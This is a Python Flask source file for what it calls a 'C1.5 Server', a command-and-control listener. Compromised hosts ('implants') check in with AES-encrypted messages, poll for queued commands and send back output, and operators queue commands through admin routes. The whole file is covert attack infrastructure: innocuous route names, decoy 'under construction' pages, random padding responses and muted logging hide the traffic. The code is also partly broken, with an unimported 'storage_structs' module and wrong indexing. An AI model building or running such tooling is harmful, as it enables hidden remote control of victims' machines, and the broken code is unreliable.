# Custom imports
from modules import storage
from modules import encryption
#####
from datetime import datetime
from flask import Flask, request, make_response, jsonify
import random
import json
import requests

# Constants, to be changed via config file or command line params later
SERVER_IP = "0.0.0.0"
SERVER_PORT = 80
ENC_KEY = "thisisakey:)1234"
RANDOM_SLEEP = False
SLEEP_DURATION = 10 # If random sleep is set to true, will have a % and use rand() % (SLEEP_DURATION+1)

# Globals for storage
operator_db = storage_structs.operator_database()
implant_db = storage_structs.implant_database()
AES_INSTANCE = encryption.AESCipher(ENC_KEY)

app = Flask(__name__)

# Override the loggin so no console messages pop up
# log = logging.getLogger('werkzeug')
# log.disabled = True

# def secho(text, file=None, nl=None, err=None, color=None, **styles):
#    pass

# def echo(text, file=None, nl=None, err=None, color=None, **styles):
#    pass

# click.echo = echo
# click.secho = secho

# Start the routing
@app.route("/", methods=['POST', 'GET'])
def under_construction():
    return "<h3>Site is still under construction, come back soon!</h3>"

@app.route("/login", methods=['POST'])
def register():
    # Read in Base64 post data
    aes_data = request.get_data()

    # Decrypt it
    data = ""
    try:
        data = AES_INSTANCE.decrypt(aes_data)
    except:
        print("There was an error decrypting the message from an implant trying to log in. Please make sure the payload was generated with the same key as the listener")
    
    # Extract the major windows version and the build number
    dec_data = data.split(":::")

    # TODO: Figure out logs, store it in a connection file
    # For now, store in just a global dict, can save later

    # Generate a name
    new_implant_name = encryption.id_generator(N=4)

    # Build a flask response consisting of
    # 1. Random 200 - 350 length string
    # 2. Cookie containing the ID of the implant
    # 3. Fake server header saying it is nginx
    reg_response = make_response(encryption.id_generator(random.randint(200,350)))
    reg_response.headers["Cookie"] = new_implant_name
    new_implant = storage_structs.implant(new_implant_name, data[0], data[1])
    implant_db.add_implant(new_implant)

    for op_name in operator_db.dict:
        # Send out a message to /update with the new implant
        op = operator_db.dict[op_name]
        url = "/update"
        data = {"s_update_type": "NEW_IMPLANT", "update_data": new_implant.__dict__}
        resp = requests.post("http://"+op.IP+":"+op.port+url, json=data)
    print(f"A new implant has connected: {new_implant_name}")
    return reg_response

# Implant goes here to check for commands
@app.route("/recipes")
def command():
    # Need to:
    # 1. Read the Cookie header, make sure it is one of the implants that
    #    signed in, else do nothing, return "Site under construction"
    # 2. Send out the command in the queue, from the store associated
    #    with the implant
    # 3. add the sent command to the global command log

    # Read the Cookie header
    implant_name = request.headers["Cookie"]
    # If not signed in, do nothing, return
    if implant_name not in implant_db.dict:
        return "Site is under construction"
    
    # If there are any commands in the queue
    if len(implant_db.dict[implant_name].command_queue) > 0:
        new_cmd = implant_db.dict[implant_name].pop_command()

        # Now encrypt the thing and send it over
        e_new_cmd = AES_INSTANCE.encrypt(new_cmd)

        resp = make_response(e_new_cmd)
        return resp
    return "0"


# Implant goes here to respond with command output
@app.route("/comment", methods=['POST'])
def output():
    # Need to:
    # 1. Read the Cookie header, make sure it is one of the implants that
    #    signed in, else do nothing, return "Site under construction
    # 2. Read the data from the POST request, decode and decrypt it

    # Read in Base64 post data
    aes_data = request.get_data()

    # Decrypt it
    data = ""
    try:
        data = AES_INSTANCE.decrypt(aes_data)
    except:
        print("There was an error decrypting the message from an implant trying to log in. Please make sure the payload was generated with the same key as the listener")

    implant_name = request.headers["Cookie"]
    # If not signed in, do nothing, return
    if implant_name not in implant_db.dict:
        return "Site is under construction"
    
    data = data.split(":::")
    ID = data[0]

    # Edit the command_db
    command_db[ID].command.output = data[1]
    command_db[ID].response_timestamp = datetime.now()

    # Build a json-able dict to send back to the operator
    r = { "command": command_db[ID].command.__dict__,
          "sent_timestamp": str(command_db[ID].sent_timestamp),
          "response_timestamp": str(command_db[ID].response_timestamp)
        }

    # Send the response back to the operator
    op = command_db[ID].operator
    url = "/update"
    data = {"s_update_type": "NEW_COMMAND_RESPONSE", "update_data": r}
    resp = requests.post("http://"+op.IP+":"+op.port+url, json=data)

    
    ret = make_response(encryption.id_generator(random.randint(200,350)))
    return ret

# Operator connects to this endpoint to login
@app.route("/admin/login", methods=['POST'])
def client_login():
    # Extract the OP_NAME from POST request body
    OP_NAME = ""
    op_ip = ""
    op_port = ""
    try:
        r_json = request.get_json()
        OP_NAME = r_json["username"]
        op_ip = r_json["lip"]
        op_port = r_json["lport"]
    except:
        return "-1"
    # Make sure the name doesn't exist
    if not operator_db.is_unique(OP_NAME):
        return "0"

    operator_db.dict[OP_NAME] = storage_structs.operator(OP_NAME, op_ip, op_port)
    tmp_db = {}
    for implant in implant_db.dict:
        tmp_db[implant] = implant_db.dict[implant].__dict__ 
    resp_json = {"implant_db": tmp_db}
    print(request.get_data())
    response = jsonify(resp_json)
    return response

# Manual reach out and update route
@app.route("/admin/update/<TO_UPDATE>", methods=['GET'])
def update_db(TO_UPDATE):
    # To update implant db on client
    if TO_UPDATE == "implants":

        tmp_db = {}
        for implant in implant_db.dict:
            tmp_db[implant] = implant_db.dict[implant].__dict__ 
        resp_json = {"implant_db": tmp_db}
        response = jsonify(resp_json)
        return response

    return ""

# Global- all pending commands, indexed by command_id, stores a command_response
command_db = {}

@app.route("/admin/management", methods=['POST'])
def op_command():
    # Pull out info from the client message
    r_json = {}
    r_json = request.get_json()
    opname = r_json["username"]
    implant_name = r_json["implant_name"]
    command_type = r_json["cmd_type"]
    arguments = r_json["arguments"]
    cmd_id = r_json["command_id"]

    # Create a command object
    cmd_obj = storage_structs.implant_command(implant_name,
                                              command_type,
                                              arguments,
                                              cmd_id
                                              )
    # debug
    print(request.get_data())

    # Match statement for each command type
    # Put the command into the queue of the implant
    implant_db.dict[implant_name].command_queue.append(arguments)
    # Put the command and operator into the command_db
    cmd_log = storage_structs.command_log(operator_db.dict[opname], cmd_obj)
    command_db[cmd_id] = cmd_log
    return "1"



if __name__ == "__main__":
    print(f"Starting C1.5 Server on {SERVER_IP} on port {SERVER_PORT}")
    # Put the flask server on a seperate thread, continue on to use the CLI interface
    app.run(host=SERVER_IP, port=SERVER_PORT, debug=False, use_reloader=False)
